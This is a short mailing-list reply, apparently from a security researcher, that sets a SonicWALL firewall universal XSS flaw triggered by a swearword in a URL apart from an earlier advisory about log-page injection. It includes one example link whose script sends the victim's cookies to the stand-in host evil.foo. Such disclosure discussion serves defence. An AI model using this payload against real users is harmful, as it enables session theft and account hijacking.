Subject: Re: Universal Website Hijacking by Exploiting Firewall Content Filtering Features + SonicWALL firewalls 0day

Hi sipherr,

The issue you referenced seems to only affect blocked sites (i.e.:
adware sites). The SonicWALL issue I reported allows you to hijack
*any site* (universal XSS) - including NON-blocked sites - by simply
inserting a swearword in the target site's URL. i.e.:

<a href="http://google.com/fuck#<script>location='http://evil.foo/
'+document.cookie</script>">Click me!</a>

Furthermore, the advisory you referenced explains how the script is
injected within the logs page, therefore the victim user can only be
the firewall administrator. The issue I reported allows you to attack
*any user* located in the LAN "protected" by the vulnerable SonicWALL
firewall.

Hope this makes sense.

Please see section "A REAL EXAMPLE AGAINST SONICWALL FIREWALLS" on the
following document for more details:
